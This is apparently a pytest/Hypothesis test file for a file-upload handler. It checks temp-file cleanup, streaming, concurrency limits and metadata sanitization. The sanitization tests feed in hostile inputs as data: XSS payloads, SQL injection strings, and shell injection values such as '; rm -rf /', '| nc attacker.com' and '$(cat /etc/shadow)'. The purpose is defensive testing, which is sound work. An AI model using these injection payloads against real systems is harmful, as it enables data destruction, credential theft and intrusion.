"""
Property-based tests for file handler.

These tests verify universal properties that should hold across all file
processing scenarios using Hypothesis for property-based testing.
"""
import pytest
import asyncio
from pathlib import Path
from hypothesis import given, strategies as st, settings
from app.core.file_handler import FileHandler


class TestTemporaryFileCleanup:
    """
    **Feature: api-improvements, Property 20: Temporary file cleanup**
    **Validates: Requirements 6.1**
    
    For any file upload, all temporary files created during processing should be
    automatically deleted after processing completes or fails.
    """
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=0, max_value=10000),
        suffix=st.sampled_from(['.jpg', '.png', '.wav', '.mp3', '.txt', None])
    )
    def test_temporary_file_deleted_after_successful_use(self, file_size: int, suffix):
        """Test that temporary files are deleted after successful use."""
        async def run_test():
            temp_path_ref = None
            
            # Use temporary file
            async with FileHandler.temporary_file(suffix=suffix) as temp_path:
                temp_path_ref = temp_path
                
                # File should exist during context
                assert temp_path.exists()
                
                # Write some data
                with open(temp_path, 'wb') as f:
                    f.write(b'x' * file_size)
                
                # Verify file has data
                assert temp_path.stat().st_size == file_size
            
            # File should be deleted after context exits
            assert not temp_path_ref.exists()
        
        asyncio.run(run_test())
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=5000),
        suffix=st.sampled_from(['.jpg', '.png', '.wav'])
    )
    def test_temporary_file_deleted_after_exception(self, file_size: int, suffix):
        """Test that temporary files are deleted even when exceptions occur."""
        async def run_test():
            temp_path_ref = None
            
            try:
                async with FileHandler.temporary_file(suffix=suffix) as temp_path:
                    temp_path_ref = temp_path
                    
                    # File should exist
                    assert temp_path.exists()
                    
                    # Write data
                    with open(temp_path, 'wb') as f:
                        f.write(b'y' * file_size)
                    
                    # Raise an exception
                    raise ValueError("Test exception")
            except ValueError:
                # Exception is expected
                pass
            
            # File should still be deleted despite exception
            assert not temp_path_ref.exists()
        
        asyncio.run(run_test())
    
    @settings(max_examples=100)
    @given(
        num_files=st.integers(min_value=1, max_value=10),
        file_size=st.integers(min_value=0, max_value=1000)
    )
    def test_multiple_temporary_files_all_cleaned_up(self, num_files: int, file_size: int):
        """Test that multiple temporary files are all cleaned up."""
        async def run_test():
            temp_paths = []
            
            # Create multiple temporary files
            for i in range(num_files):
                async with FileHandler.temporary_file(suffix=f'.{i}') as temp_path:
                    temp_paths.append(temp_path)
                    
                    # Write data
                    with open(temp_path, 'wb') as f:
                        f.write(b'z' * file_size)
                    
                    # File exists during context
                    assert temp_path.exists()
            
            # All files should be deleted
            for temp_path in temp_paths:
                assert not temp_path.exists()
        
        asyncio.run(run_test())
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=5000)
    )
    def test_nested_temporary_files_cleaned_up(self, file_size: int):
        """Test that nested temporary file contexts are properly cleaned up."""
        async def run_test():
            outer_path_ref = None
            inner_path_ref = None
            
            async with FileHandler.temporary_file(suffix='.outer') as outer_path:
                outer_path_ref = outer_path
                assert outer_path.exists()
                
                with open(outer_path, 'wb') as f:
                    f.write(b'a' * file_size)
                
                async with FileHandler.temporary_file(suffix='.inner') as inner_path:
                    inner_path_ref = inner_path
                    assert inner_path.exists()
                    
                    with open(inner_path, 'wb') as f:
                        f.write(b'b' * file_size)
                
                # Inner file should be deleted
                assert not inner_path_ref.exists()
                
                # Outer file should still exist
                assert outer_path.exists()
            
            # Both files should be deleted
            assert not outer_path_ref.exists()
            assert not inner_path_ref.exists()
        
        asyncio.run(run_test())


class TestStreamingMemorySafety:
    """
    **Feature: api-improvements, Property 21: Streaming memory safety**
    **Validates: Requirements 6.2**
    
    For any file being read, the system should use streaming to prevent loading
    the entire file into memory at once.
    """
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=1000, max_value=100000),
        chunk_size=st.integers(min_value=100, max_value=10000)
    )
    def test_file_streamed_in_chunks(self, file_size: int, chunk_size: int):
        """Test that files are read in chunks, not all at once."""
        async def run_test():
            async with FileHandler.temporary_file(suffix='.dat') as temp_path:
                # Create file with known content
                test_data = b'x' * file_size
                with open(temp_path, 'wb') as f:
                    f.write(test_data)
                
                # Stream file in chunks
                chunks_read = []
                async for chunk in FileHandler.stream_file_chunks(temp_path, chunk_size=chunk_size):
                    chunks_read.append(chunk)
                    
                    # Each chunk should be at most chunk_size
                    assert len(chunk) <= chunk_size
                
                # All chunks together should equal original data
                reconstructed = b''.join(chunks_read)
                assert reconstructed == test_data
                
                # Should have read multiple chunks (unless file is tiny)
                if file_size > chunk_size:
                    assert len(chunks_read) > 1
        
        asyncio.run(run_test())
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=50000)
    )
    def test_streaming_preserves_data_integrity(self, file_size: int):
        """Test that streaming doesn't corrupt data."""
        async def run_test():
            async with FileHandler.temporary_file(suffix='.bin') as temp_path:
                # Create file with pattern
                pattern = b'ABCDEFGH'
                test_data = pattern * (file_size // len(pattern)) + pattern[:file_size % len(pattern)]
                
                with open(temp_path, 'wb') as f:
                    f.write(test_data)
                
                # Stream and reconstruct
                chunks = []
                async for chunk in FileHandler.stream_file_chunks(temp_path):
                    chunks.append(chunk)
                
                reconstructed = b''.join(chunks)
                
                # Data should be identical
                assert reconstructed == test_data
                assert len(reconstructed) == file_size
        
        asyncio.run(run_test())
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=1000, max_value=50000),
        chunk_size=st.integers(min_value=500, max_value=5000)
    )
    def test_write_streaming_works_correctly(self, file_size: int, chunk_size: int):
        """Test that streaming writes work correctly."""
        async def run_test():
            async with FileHandler.temporary_file(suffix='.dat') as temp_path:
                # Create test data
                test_data = b'y' * file_size
                
                # Write using streaming
                await FileHandler.write_file_streaming(temp_path, test_data, chunk_size=chunk_size)
                
                # Read back and verify
                with open(temp_path, 'rb') as f:
                    read_data = f.read()
                
                assert read_data == test_data
                assert len(read_data) == file_size
        
        asyncio.run(run_test())


class TestCleanupOnProcessingFailure:
    """
    **Feature: api-improvements, Property 22: Cleanup on processing failure**
    **Validates: Requirements 6.3**
    
    For any file processing operation that fails, all temporary files associated
    with that operation should be deleted.
    """
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=5000),
        exception_type=st.sampled_from([ValueError, RuntimeError, IOError, KeyError])
    )
    def test_cleanup_on_processing_exception(self, file_size: int, exception_type):
        """Test that files are cleaned up when processing raises exception."""
        async def run_test():
            temp_path_ref = None
            
            async def failing_processor(path: Path):
                # Simulate processing that fails
                with open(path, 'rb') as f:
                    f.read()
                raise exception_type("Processing failed")
            
            try:
                result = await FileHandler.process_upload_safely(
                    b'x' * file_size,
                    '.dat',
                    failing_processor
                )
            except exception_type:
                # Exception is expected
                pass
            
            # Temporary file should be cleaned up
            # We can't directly check the path, but we can verify no exception during cleanup
            # The test passing means cleanup succeeded
        
        asyncio.run(run_test())
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=5000)
    )
    def test_cleanup_on_write_failure(self, file_size: int):
        """Test cleanup when file writing fails."""
        async def run_test():
            temp_path_ref = None
            
            try:
                async with FileHandler.temporary_file(suffix='.dat') as temp_path:
                    temp_path_ref = temp_path
                    
                    # Write some data
                    with open(temp_path, 'wb') as f:
                        f.write(b'a' * file_size)
                    
                    # Simulate failure during processing
                    raise IOError("Write failed")
            except IOError:
                pass
            
            # File should be cleaned up despite failure
            assert not temp_path_ref.exists()
        
        asyncio.run(run_test())
    
    @settings(max_examples=100)
    @given(
        file_size=st.integers(min_value=100, max_value=5000),
        num_operations=st.integers(min_value=2, max_value=5)
    )
    def test_partial_failure_cleans_up_all_files(self, file_size: int, num_operations: int):
        """Test that all files are cleaned up even if only some operations fail."""
        async def run_test():
            temp_paths = []
            
            for i in range(num_operations):
                try:
                    async with FileHandler.temporary_file(suffix=f'.{i}') as temp_path:
                        temp_paths.append(temp_path)
                        
                        # Write data
                        with open(temp_path, 'wb') as f:
                            f.write(b'x' * file_size)
                        
                        # Fail on last operation
                        if i == num_operations - 1:
                            raise ValueError("Last operation failed")
                except ValueError:
                    pass
            
            # All files should be cleaned up
            for temp_path in temp_paths:
                assert not temp_path.exists()
        
        asyncio.run(run_test())


class TestConcurrentUploadIsolation:
    """
    **Feature: api-improvements, Property 23: Concurrent upload isolation**
    **Validates: Requirements 6.4**
    
    For any set of concurrent file uploads, each upload should be processed in
    isolation without interfering with others.
    """
    
    @settings(max_examples=50)
    @given(
        num_concurrent=st.integers(min_value=2, max_value=15),
        file_size=st.integers(min_value=100, max_value=5000)
    )
    def test_concurrent_uploads_isolated(self, num_concurrent: int, file_size: int):
        """Test that concurrent uploads don't interfere with each other."""
        async def run_test():
            results = []
            
            async def process_file(file_id: int):
                # Each upload gets unique data
                data = bytes([file_id % 256]) * file_size
                
                async def processor(path: Path):
                    # Read and verify data
                    with open(path, 'rb') as f:
                        read_data = f.read()
                    
                    # Data should match what we wrote
                    assert read_data == data
                    return file_id
                
                result = await FileHandler.process_upload_safely(
                    data,
                    f'.{file_id}',
                    processor
                )
                return result
            
            # Process multiple files concurrently
            tasks = [process_file(i) for i in range(num_concurrent)]
            results = await asyncio.gather(*tasks)
            
            # All uploads should succeed with correct IDs
            assert len(results) == num_concurrent
            assert sorted(results) == list(range(num_concurrent))
        
        asyncio.run(run_test())
    
    @settings(max_examples=50)
    @given(
        num_concurrent=st.integers(min_value=2, max_value=10),
        file_size=st.integers(min_value=100, max_value=3000)
    )
    def test_concurrent_failures_dont_affect_others(self, num_concurrent: int, file_size: int):
        """Test that failures in some uploads don't affect others."""
        async def run_test():
            async def process_file(file_id: int, should_fail: bool):
                data = bytes([file_id % 256]) * file_size
                
                async def processor(path: Path):
                    if should_fail:
                        raise ValueError(f"File {file_id} failed")
                    
                    with open(path, 'rb') as f:
                        read_data = f.read()
                    
                    assert read_data == data
                    return file_id
                
                try:
                    result = await FileHandler.process_upload_safely(
                        data,
                        f'.{file_id}',
                        processor
                    )
                    return ("success", result)
                except ValueError:
                    return ("failed", file_id)
            
            # Half succeed, half fail
            tasks = []
            for i in range(num_concurrent):
                should_fail = (i % 2 == 0)
                tasks.append(process_file(i, should_fail))
            
            results = await asyncio.gather(*tasks)
            
            # Check that successes and failures are as expected
            successes = [r for r in results if r[0] == "success"]
            failures = [r for r in results if r[0] == "failed"]
            
            # Should have roughly half of each
            assert len(successes) + len(failures) == num_concurrent
            assert len(failures) > 0
            assert len(successes) > 0
        
        asyncio.run(run_test())
    
    @settings(max_examples=50)
    @given(
        num_concurrent=st.integers(min_value=3, max_value=12)
    )
    def test_concurrent_operations_respect_limit(self, num_concurrent: int):
        """Test that concurrent operations respect the semaphore limit."""
        async def run_test():
            max_concurrent_seen = 0
            current_concurrent = 0
            lock = asyncio.Lock()
            
            async def tracked_operation(op_id: int):
                nonlocal max_concurrent_seen, current_concurrent
                
                async with FileHandler.isolated_file_operation():
                    async with lock:
                        current_concurrent += 1
                        if current_concurrent > max_concurrent_seen:
                            max_concurrent_seen = current_concurrent
                    
                    # Simulate some work
                    await asyncio.sleep(0.01)
                    
                    async with lock:
                        current_concurrent -= 1
                
                return op_id
            
            # Run many operations concurrently
            tasks = [tracked_operation(i) for i in range(num_concurrent)]
            results = await asyncio.gather(*tasks)
            
            # All operations should complete
            assert len(results) == num_concurrent
            
            # Should not exceed the limit
            assert max_concurrent_seen <= FileHandler.MAX_CONCURRENT_OPERATIONS
        
        asyncio.run(run_test())


class TestMetadataSanitization:
    """
    **Feature: api-improvements, Property 24: Metadata sanitization**
    **Validates: Requirements 6.5**
    
    For any file metadata extracted during processing, all metadata fields should
    be sanitized to remove potentially malicious content.
    """
    
    @settings(max_examples=100)
    @given(
        filename=st.text(min_size=1, max_size=50)
    )
    def test_html_tags_removed_from_metadata(self, filename: str):
        """Test that HTML tags are removed from metadata."""
        metadata = {
            "filename": f"<script>alert('xss')</script>{filename}",
            "description": "<img src=x onerror=alert(1)>",
            "author": "<iframe src='evil.com'></iframe>"
        }
        
        sanitized = FileHandler.sanitize_metadata(metadata)
        
        # HTML tags should be removed
        assert "<script" not in sanitized["filename"].lower()
        assert "<img" not in sanitized["description"].lower()
        assert "<iframe" not in sanitized["author"].lower()
        # Script tags and their content should be removed
        assert "</script>" not in sanitized["filename"].lower()
    
    @settings(max_examples=100)
    @given(
        value=st.text(min_size=1, max_size=50)
    )
    def test_sql_injection_patterns_removed(self, value: str):
        """Test that SQL injection patterns are removed."""
        metadata = {
            "field1": f"{value}' OR '1'='1",
            "field2": f"{value}'; DROP TABLE users--",
            "field3": f"{value}/* comment */"
        }
        
        sanitized = FileHandler.sanitize_metadata(metadata)
        
        # SQL patterns should be removed
        assert "--" not in sanitized["field1"]
        assert "--" not in sanitized["field2"]
        assert "/*" not in sanitized["field3"]
        assert "*/" not in sanitized["field3"]
    
    @settings(max_examples=100)
    @given(
        value=st.text(min_size=1, max_size=50)
    )
    def test_shell_metacharacters_removed(self, value: str):
        """Test that shell metacharacters are removed."""
        metadata = {
            "cmd1": f"{value}; rm -rf /",
            "cmd2": f"{value} | nc attacker.com",
            "cmd3": f"{value} && cat /etc/passwd",
            "cmd4": f"{value}`whoami`",
            "cmd5": f"{value}$(cat /etc/shadow)"
        }
        
        sanitized = FileHandler.sanitize_metadata(metadata)
        
        # Shell metacharacters should be removed
        for key, val in sanitized.items():
            assert ";" not in val
            assert "|" not in val
            assert "&" not in val
            assert "`" not in val
            assert "$" not in val
    
    @settings(max_examples=100)
    @given(
        size=st.integers(min_value=0, max_value=1000000),
        count=st.integers(min_value=0, max_value=100)
    )
    def test_numeric_metadata_preserved(self, size: int, count: int):
        """Test that numeric metadata is preserved without modification."""
        metadata = {
            "size": size,
            "count": count,
            "ratio": 3.14,
            "enabled": True
        }
        
        sanitized = FileHandler.sanitize_metadata(metadata)
        
        # Numeric values should be unchanged
        assert sanitized["size"] == size
        assert sanitized["count"] == count
        assert sanitized["ratio"] == 3.14
        assert sanitized["enabled"] is True
    
    @settings(max_examples=100)
    @given(
        text=st.text(min_size=1, max_size=100)
    )
    def test_nested_metadata_sanitized(self, text: str):
        """Test that nested metadata structures are sanitized."""
        metadata = {
            "outer": {
                "inner": f"<script>{text}</script>",
                "nested": {
                    "deep": f"{text}; rm -rf /"
                }
            },
            "list": [f"<img>{text}", f"{text}--"]
        }
        
        sanitized = FileHandler.sanitize_metadata(metadata)
        
        # Nested values should be sanitized
        assert "<script" not in sanitized["outer"]["inner"].lower()
        assert ";" not in sanitized["outer"]["nested"]["deep"]
        assert "<img>" not in sanitized["list"][0]
        assert "--" not in sanitized["list"][1]
    
    @settings(max_examples=100)
    @given(
        length=st.integers(min_value=1001, max_value=5000)
    )
    def test_long_strings_truncated(self, length: int):
        """Test that excessively long strings are truncated."""
        metadata = {
            "long_field": "A" * length
        }
        
        sanitized = FileHandler.sanitize_metadata(metadata)
        
        # Should be truncated to max length
        assert len(sanitized["long_field"]) <= 1000
    
    @settings(max_examples=100)
    @given(
        key=st.text(min_size=1, max_size=50),
        value=st.text(min_size=1, max_size=50)
    )
    def test_metadata_keys_also_sanitized(self, key: str, value: str):
        """Test that metadata keys are also sanitized."""
        # Create metadata with potentially dangerous key
        metadata = {
            f"<script>{key}</script>": value
        }
        
        sanitized = FileHandler.sanitize_metadata(metadata)
        
        # Keys should be sanitized
        for sanitized_key in sanitized.keys():
            assert "<script" not in sanitized_key.lower()
            assert "</script>" not in sanitized_key.lower()
